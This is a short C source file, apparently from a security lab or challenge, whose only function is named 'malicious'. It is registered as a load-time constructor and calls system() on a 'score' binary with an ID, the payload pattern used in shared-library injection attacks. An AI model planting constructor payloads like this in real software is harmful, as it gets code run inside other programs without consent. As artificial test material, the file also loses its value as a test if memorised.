#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 966a41a2-0d41-427e-bac4-3a9ed886005c");
}
